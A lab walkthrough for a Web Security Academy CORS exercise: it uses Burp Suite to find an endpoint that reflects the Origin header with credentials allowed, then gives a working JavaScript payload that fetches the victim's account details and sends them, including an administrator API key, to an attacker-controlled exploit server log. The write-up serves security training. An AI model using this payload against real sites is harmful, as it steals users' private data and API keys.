### First start with adding a Target Scope in BurpSuite for our target domain.
![image](https://user-images.githubusercontent.com/86168235/127899355-b86915fc-3270-4a4b-8902-5571fa7a49b3.png)

**Note**:- Optionally, you can set a filter to *Show only in-scope items* by clicking on the **Filter** bar under **Sitemap** subtab, so that you can focus on your target domain.

![image](https://user-images.githubusercontent.com/86168235/127899507-8d798439-4e1b-460c-bb4b-ad0afd0e324e.png)



Now, login using the credentials provided to you. In burp you'll see that there is **GET** request to page `/acccountDetails` which fetches the account details for the user logging in. In the response, you'll see there is a CORS header `Access-Control-Allow-Credentials: true` which means CORS is most likely enabled for the site. Send this request to Burp repeater.

![image](https://user-images.githubusercontent.com/86168235/127900481-0102d862-0913-4569-87d6-888b66176612.png)

On the repeater tab add a `Origin` header to it and send the request. You'll see that in the response there is a new CORS header `Access-Control-Allow-Origin` which sets request origin to the `Origin` we've set. This means we can set the Origin to any url we like.

![image](https://user-images.githubusercontent.com/86168235/127900629-9ef94994-d73b-49c4-ae68-d74a44287c1a.png)

## Exploitation

**Next**, `Go to exploit server` and add the following script in the **Body** box:-
```
<script>
const xhr = new XMLHttpRequest(),
    method = "GET",
    url = "https://acb61f441f1165dd803631dc00200052.web-security-academy.net/accountDetails";
    
function handler() {
    location='/log?body='+this.responseText;
    };
xhr.onload = handler;
xhr.open(method, url, true);
xhr.withCredentials = true;
xhr.send();

</script>
```
**Note**:- You've to edit the **url** to your own target url.

Now, if you click on `View exploit` you'll see that the response body of `/accountDetails` is shown in the url. Finally, click on `Deliver exploit to victim` and after that click on `Access log`. You'll notice that there is login by the `administrator` user and the response body along with the `api key` is logged in the exploit server.

![image](https://user-images.githubusercontent.com/86168235/127901447-b9940afd-40b8-4d05-a3ec-d63d41130405.png)
